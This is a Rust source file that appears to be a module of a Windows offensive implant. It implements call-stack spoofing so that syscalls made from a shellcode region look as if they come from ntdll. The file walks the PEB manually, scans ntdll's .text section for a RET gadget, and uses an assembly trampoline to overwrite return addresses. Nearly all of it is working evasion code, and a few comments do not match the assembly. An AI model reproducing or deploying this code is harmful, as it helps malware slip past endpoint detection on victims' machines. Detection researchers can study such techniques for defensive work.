//! spoof.rs — Return address / call stack spoofing
//!
//! Implements a trampoline-based stack spoof so that syscall-intensive
//! operations appear to originate from a benign call site (e.g. ntdll
//! itself) rather than from our shellcode region.
//!
//! spoof_stack(target_fn, args)  — call target_fn with a spoofed return
//!                                 address on the stack
//! find_gadget()                 — locate a `jmp [rsp+?]` or `ret` gadget
//!                                 inside ntdll to use as the trampoline

#![allow(dead_code, non_snake_case)]

use std::arch::global_asm;

// ── Global trampoline gadget address (set once during init) ────────────────

#[no_mangle]
pub static mut G_GADGET_ADDR: usize = 0;

/// Set the trampoline gadget address.  Call during startup after ntdll is
/// resolved (e.g. right after resolve_ntqsi()).
pub unsafe fn init_gadget() {
    if let Some(addr) = find_ret_gadget() {
        G_GADGET_ADDR = addr;
    }
}

// ── Gadget scanner ─────────────────────────────────────────────────────────

/// Scan ntdll .text for the first `C3` (RET) byte that is preceded by a
/// valid instruction — used as the trampoline pivot.  We specifically want
/// a `ret` inside an exported stub so the unwinder sees a real frame.
unsafe fn find_ret_gadget() -> Option<usize> {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    e = *(e as *const *const u8); // [0] exe
    e = *(e as *const *const u8); // [1] ntdll ← we want this
    let base = *(e.add(0x30) as *const *const u8) as *const u8;

    // Parse PE to find .text section bounds
    let pe_off   = *(base.add(0x3C) as *const u32) as usize;
    let nt       = base.add(pe_off);
    // NumberOfSections at NT+0x06
    let num_sec  = *(nt.add(0x06) as *const u16) as usize;
    // SizeOfOptionalHeader at NT+0x14
    let opt_size = *(nt.add(0x14) as *const u16) as usize;
    // Section table starts after optional header
    let sec_base = nt.add(0x18 + opt_size);

    for i in 0..num_sec {
        let sec = sec_base.add(i * 0x28);
        // Section name is 8 bytes at offset 0
        let name = core::slice::from_raw_parts(sec, 8);
        // Look for ".text" (0x2e, 0x74, 0x65, 0x78, 0x74)
        if &name[..5] != b".text" { continue; }

        let virt_addr = *(sec.add(0x0C) as *const u32) as usize;
        let virt_size = *(sec.add(0x08) as *const u32) as usize;
        let text_start = base.add(virt_addr);

        // Scan for C3 (RET) — pick one that's at least 4 bytes from the start
        // so it's inside a real function body, not a one-byte stub.
        for off in 4..virt_size.saturating_sub(1) {
            if *text_start.add(off) == 0xC3 {
                return Some(text_start.add(off) as usize);
            }
        }
    }
    None
}

// ── Spoof trampoline (global_asm) ──────────────────────────────────────────
//
// Layout on entry to spoof_gate:
//   RSP+0x00 = real return address (to our caller)
//   RSP+0x08 = target fn ptr
//   RSP+0x10 = arg0  (RCX on entry already set by Rust caller convention)
//   ...
//
// We overwrite the return address slot with G_GADGET_ADDR so that when
// target_fn executes `ret`, it lands in ntdll instead of back here.
// The gadget is a plain `ret` which then pops the real return address
// we pushed below it.

global_asm!(
    ".globl spoof_gate",
    "spoof_gate:",
    // Save the real return address
    "    pop  rax",                             // rax = real return addr
    // Load target function pointer (first extra arg, passed in r10 by spoof_stack)
    "    mov  r11, [rsp]",                      // r11 = target fn ptr
    "    add  rsp, 8",                          // consume target fn slot
    // Build the fake stack frame:
    //   push real_ret_addr  (gadget will ret to this)
    //   push gadget_addr    (target fn will ret to this)
    "    push rax",                             // real return addr below gadget ret
    "    lea  rax, [rip + G_GADGET_ADDR]",
    "    mov  rax, [rax]",
    "    push rax",                             // gadget addr = fake return addr
    // Jump to target — args are already in rcx/rdx/r8/r9/stack from Rust ABI
    "    jmp  r11",
);

extern "C" {
    fn spoof_gate();
}

/// Call `target` with up to 4 register args already set by the Rust compiler.
/// The return address seen by `target` will be a `ret` gadget inside ntdll.
///
/// # Safety
/// - G_GADGET_ADDR must have been set by `init_gadget()` before calling.
/// - `target` must follow the MS x64 ABI (rcx/rdx/r8/r9 args).
pub unsafe fn spoof_stack(
    target: unsafe extern "system" fn() -> isize,
    arg0: usize,
    arg1: usize,
    arg2: usize,
    arg3: usize,
) -> isize {
    if G_GADGET_ADDR == 0 {
        // Gadget not initialised — fall back to direct call (no spoof)
        return core::mem::transmute::<
            unsafe extern "system" fn() -> isize,
            unsafe extern "system" fn(usize, usize, usize, usize) -> isize,
        >(target)(arg0, arg1, arg2, arg3);
    }

    // We use a small inline asm thunk to:
    //   1. Push the target fn ptr onto the stack where spoof_gate can read it
    //   2. Set up the four integer args in rcx/rdx/r8/r9
    //   3. Call spoof_gate (which will redirect the return address)
    let result: isize;
    core::arch::asm!(
        // Push target fn ptr — spoof_gate pops it from [rsp] after we call it
        "sub  rsp, 8",
        "mov  [rsp], {tgt}",
        // Args
        "mov  rcx, {a0}",
        "mov  rdx, {a1}",
        "mov  r8,  {a2}",
        "mov  r9,  {a3}",
        "call {gate}",
        "add  rsp, 8",
        tgt  = in(reg) target as usize,
        a0   = in(reg) arg0,
        a1   = in(reg) arg1,
        a2   = in(reg) arg2,
        a3   = in(reg) arg3,
        gate = sym spoof_gate,
        lateout("rax") result,
        // Clobbers
        out("rcx") _, out("rdx") _, out("r8") _, out("r9") _,
        out("r10") _, out("r11") _,
    );
    result
}
